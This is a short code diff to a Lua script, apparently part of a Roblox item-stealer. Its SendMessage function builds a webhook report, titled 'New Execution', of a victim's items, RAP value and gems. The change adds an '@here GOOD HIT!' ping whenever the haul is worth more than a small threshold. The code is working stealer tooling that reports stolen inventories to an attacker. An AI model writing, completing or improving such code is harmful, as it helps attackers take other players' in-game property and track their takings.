@@ -146,11 +146,16 @@ local function SendMessage(url, username, diamonds)
         fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
         totalRAP = totalRAP + (itemData.rap * itemData.amount)
     end
-
+    if totalRAP > 10 then
+		poopie = "@here GOOD HIT!"
+    else
+		poopie = "poop hit"
+    end
     fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
     fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
 
     local data = {
+	["content"] = poopie,
         ["embeds"] = {{
             ["title"] = "New Execution" ,
             ["color"] = 65280,
